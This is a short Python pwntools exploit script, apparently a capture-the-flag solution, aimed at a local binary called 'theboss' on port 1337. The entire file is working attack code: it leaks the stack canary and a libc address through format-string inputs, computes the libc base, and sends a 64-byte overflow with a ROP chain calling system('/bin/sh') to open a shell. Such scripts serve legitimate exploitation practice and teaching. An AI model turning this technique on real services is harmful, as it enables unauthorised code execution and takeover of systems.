#!/usr/bin/python3

from pwn import *

elf = ELF("./theboss")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

rop_elf = ROP(elf)

IP = "localhost"
PORT = 1337

gs = '''
break strategical_aproach
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(IP, PORT)

    return process(elf.path)

# Helper i/o functions:
def leak(data):
    p.sendlineafter(b">>\n", b"1")
    p.sendlineafter(b"term: \n", data)
    
    p.recvline()
    p.recvline()
    return p.recvline()

def set_flag(data):
    p.sendlineafter(b">>\n", b"3")
    p.sendlineafter(b"overdo it!\n", data)

def get_shell(data):
    p.sendlineafter(b">>\n", b"4")
    p.sendlineafter(b"!\n", data)

p = start()

# Automate the canary leak:
# for i in range(0, 50):
#    print(leak(b"%" + str(i).encode() + b"$p") + b" " + str(i).encode())

canary = int(leak(b"%9$p"), 16)
libc_leak = int(leak(b"%3$p"), 16)

log.info(f"The canary: {hex(canary)}")
log.info(f"The libc leak: {hex(libc_leak)}")

# Calculate the libc start base. The leak's offset 
# from the libc start address is always equal to 0xec833
libc.address = libc_leak - 0xec833
log.info(f"The libc @: {hex(libc.address)}")

set_flag(b"tsiou,tsiou")

ret = p64(rop_elf.find_gadget(['ret'])[0])
pop_rdi = p64(rop_elf.find_gadget(['pop rdi', 'ret'])[0])
binsh = p64(next(libc.search(b"/bin/sh\x00")))
system = p64(libc.sym.system)

payload = b"a"*64 + p64(canary) + ret + pop_rdi + binsh + system

get_shell(payload)

p.interactive()


